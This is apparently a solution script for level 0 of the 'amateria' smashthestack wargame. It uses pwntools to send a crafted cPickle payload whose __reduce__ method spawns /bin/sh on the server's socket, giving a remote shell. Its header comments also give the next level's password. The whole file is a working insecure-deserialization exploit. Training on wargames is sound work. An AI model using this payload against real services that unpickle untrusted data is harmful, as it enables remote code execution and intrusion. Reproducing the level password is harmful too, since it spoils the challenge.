# http://amateria.smashthestack.org:89/
# Credentials = level0 : -
# Next        = level1 : boink
#
# Spawns a shell for level 0

from pwn import *
import cPickle
import subprocess

class PWN(object):
    def __reduce__(self):
        fd = 4
        return (subprocess.Popen,
            (
                ('/bin/sh',),
                0,
                None,
                fd, fd, fd
            )
        )

payload = cPickle.dumps(PWN())
conn = remote('amateria.smashthestack.org', 54321)
conn.sendline(payload)
conn.interactive()
